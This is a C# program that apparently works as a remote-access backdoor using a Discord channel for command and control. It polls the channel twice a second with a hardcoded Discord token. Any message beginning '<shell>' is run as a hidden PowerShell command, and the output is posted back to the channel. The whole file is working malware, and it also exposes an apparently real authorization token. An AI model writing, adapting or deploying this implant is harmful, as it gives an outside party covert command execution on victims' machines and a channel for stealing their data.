using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Diagnostics;

class Program {
    static void Main() {
        Program program = new Program();


        string url = "https://discord.com/api/v9/channels/1210194870850031656/messages";
        string discordToken = "MTE5ODY3Njc4NTg5MDYwNzE3Nw.GnqMWY.3rwKiCVRerCjS_meDerhJDfubEZWbrwbrsYA_k";

        HttpClient httpClient = new HttpClient();
        httpClient.DefaultRequestHeaders.Add("Authorization", discordToken);

        while (true) {
            Thread.Sleep(500);

            HttpResponseMessage response = httpClient.GetAsync(url + "?limit=1").Result;

            if (response.IsSuccessStatusCode) {
                string responseBody = response.Content.ReadAsStringAsync().Result;

                if (responseBody.Contains("\"content\":")) {
                    int startIndex = responseBody.IndexOf("\"content\":") + 11;
                    int endIndex = responseBody.IndexOf("\"", startIndex);
                    string content = responseBody.Substring(startIndex, endIndex - startIndex);

                    if (content.StartsWith("<shell>")) {
                        Console.WriteLine($"shell is >> {content.Substring(7)}");

                        ProcessStartInfo psi = new ProcessStartInfo("powershell")
                        {
                            Arguments = content.Substring(7),
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        using (Process process = Process.Start(psi))
                        {
                            if (process != null)
                            {
                                /*string result = process.StandardOutput.ReadToEnd();*/
                                string result = process.StandardOutput.ReadToEnd();
                                process.WaitForExit();

                                // string postContent = "{\"content\": \"" + result.Replace("\n", "").Replace("\r", "").Replace("\\", "/") + "\"}";
                                string postContent = "{\"content\": \"" + result.Replace("\\", "/") + "\"}";
                                Console.WriteLine(postContent);

                                StringContent postStringContent = new StringContent(postContent.Replace("\n", " ").Replace("\r", " "), Encoding.UTF8, "application/json");

                                httpClient.PostAsync(url, postStringContent).Wait();
                            }
                        }
                    }
                }
            }
        }
    }
}